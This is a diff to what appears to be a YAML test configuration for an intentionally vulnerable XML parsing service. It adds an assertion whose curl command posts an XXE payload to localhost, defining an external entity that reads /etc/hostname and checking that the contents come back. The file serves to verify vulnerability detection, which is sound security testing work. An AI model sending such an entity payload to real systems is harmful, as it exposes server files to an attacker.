@@ -15,6 +15,12 @@ ready:
   interval: 3s
 
 assertions:
+  - name: exploit-xxe-file-read
+    type: command
+    expect:
+      command: "curl -sf -X POST http://localhost:9221/parse -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>' | grep -qE '.+'"
+      exit_code: 0
+
   - name: detects-xxe
     type: beacon
     target: xxe-app:8080
